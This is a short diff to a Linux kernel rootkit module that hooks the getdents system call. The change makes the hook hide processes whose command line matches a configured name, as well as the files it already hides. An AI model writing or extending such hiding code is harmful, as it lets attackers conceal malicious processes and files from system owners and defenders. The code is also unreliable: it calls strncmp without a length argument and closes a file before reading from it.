@@ -150,10 +150,12 @@ asmlinkage long totallyReal_getdents(unsigned int fd, struct linux_dirent * dirp
 			filp_close(f, NULL);
 			file_read(f, 0, buf, BUF_SIZE - 1);
 			pr_info("FAKEGETDENTS: cmdline is %s", buf);
-			
 		}
+		int is_proc_name_match = 0;
+		if ( strncmp( buf, HIDE_PROCESS ) == 0 )
+			is_proc_name_match = 1;
 
-		if (strstr(p_dirp->d_name, HIDE_FILE) != NULL ) {
+		if (strstr(p_dirp->d_name, HIDE_FILE) != NULL || is_proc_name_match ) {
 			if (p_dirp == mod_dirp) {
 				pr_info("FAKEGETDENTS: hiding %s", p_dirp->d_name);
 				nread -= p_dirent_len;
